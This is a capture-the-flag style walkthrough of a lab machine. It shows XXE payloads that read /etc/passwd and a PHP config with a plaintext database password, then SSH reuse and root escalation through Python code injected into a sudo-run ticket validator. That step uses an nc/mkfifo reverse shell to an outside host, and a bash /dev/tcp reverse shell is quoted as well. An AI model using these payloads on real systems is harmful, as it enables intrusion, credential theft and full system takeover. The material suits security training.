# Bounty Hunter

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf

```
        assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
        .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
        [Status: 200, Size: 0, Words: 1, Lines: 1]
        css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
        js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
        index.php               [Status: 200, Size: 0, Words: 1, Lines: 1]
        resources               [Status: 301, Size: 316, Words: 20, Lines: 10]
        server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]

        //php pages
        .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
        .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
        db                      [Status: 200, Size: 0, Words: 1, Lines: 1]
        portal                  [Status: 200, Size: 125, Words: 11, Lines: 6]
        index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
```

ok enumeration was nothing special but I found a db.php page but the page was empty..might have some nterresting php

enum on website gave us a log_submit.php page from portal button

note to self: consider adding nikto to my enum tools

there is a php form to add bugs to a database

```
If DB were ready, would have added:
Title: title
CWE: CWE
Score: 0.0
Reward: 1
```

we captured the same request in burpsuite

POST request made to http://10.10.11.100/tracker_diRbPr00f314.php

with a parameter

```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50aXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz4wLjA8L2N2c3M%2BCgkJPHJld2FyZD4xPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
```

with decoder we see its xml format of our request (url decode + base64 decode)

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
<title>title</title>
<cwe>CWE</cwe>
<cvss>0.0</cvss>
<reward>1</reward>
</bugreport>
```

XML injection it is

our XXE payload model will be simple like this

`<!DOCTYPE data [ <!ENTITY file SYSTEM "file://{absolute file path}"> ]>`  
and `&file;` where we want the output

So first test (make sure your xml is well-formatted! Used xmlgrid.net to check)

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]>
<bugreport>
<title>title</title>
<cwe>CWE</cwe>
<cvss>0.0</cvss>
<reward>&file;</reward>
</bugreport>
```

we base64 encode it then url encode and pass it to repeater `data=` parameter
And we get our output

```
127.0.0.1 localhost
127.0.1.1 bountyhunter

# The following lines are desirable for IPv6 capable hosts

::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Great success..now we can read more interresting files like /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

There is a `development` user but we can't read his .ssh/id_rsa key...lets try to read php files.../var/www/html/db.php

No output...but I could read another php file tracker_diRbPr00f314.php with no interresting output

It means the payload is not convenient to read this one...there must be a php filter...so we change payload model

`<!DOCTYPE data [ <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource={absolute file path}"> ]>`  
with `&file;` for output

Now when applied

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php">]>
<bugreport>
<title>title</title>
<cwe>CWE</cwe>
<cvss>0.0</cvss>
<reward>&file;</reward>
</bugreport>
```

We get our output

```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

we decode it as base64

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

haha yes success database credentials that may also be used to ssh as development user (sql db way to explore)

First things first..USER FLAG
`development@bountyhunter:~$ cat user.txt`

In the same folder we get `contract.txt`
`development@bountyhunter:~$ cat contract.txt`

```
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

And `dd.md`

```
# Skytrain Inc

## Ticket to

**Ticket Code:**
\*\*1404 + 10 == 1414 and **import**('os').system("bash -c 'exec bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'") == False
```

## Priilege escalation

Good old' privEsc ways
`sudo -l`

```
Matching Defaults entries for development on bountyhunter:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

we can run ticketValidator as root uh? let's make that python script spawn a shell

copied the script in a python file to analyze it...it basically validate a markdown (.md) file with specific format
the dd.md file is an example that matches exactly a valid file and anything inserted correctlly after "and" would be executed as root:

we modify it to get us a shell on netcat 2311

```
# Skytrain Inc

## Ticket to

**Ticket Code:**
\*\*102+ 10 == 112 and **import**('os').system('rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.10.14.178 2311 >/tmp/h') == False
```

we prepare a server to send our `exploit.md` file

```
sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

we get it in /tmp folder

```
development@bountyhunter:/tmp$ wget http://10.10.14.178/exploit.md
--2021-11-03 14:17:42-- http://10.10.14.178/exploit.md
Connecting to 10.10.14.178:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185 [text/markdown]
Saving to: ‘exploit.md’

exploit.md 100%[========================================================================================================================================>] 185 --.-KB/s in 0s

2021-11-03 14:17:42 (18.9 MB/s) - ‘exploit.md’ saved [185/185]
```

we execute the script

```
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
./exploit.md
Destination:
rm: cannot remove '/tmp/h': No such file or directory
```

And we get a root shell on nc listener

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Lets secure our victory

`# cat root.txt`

Now its free real estate
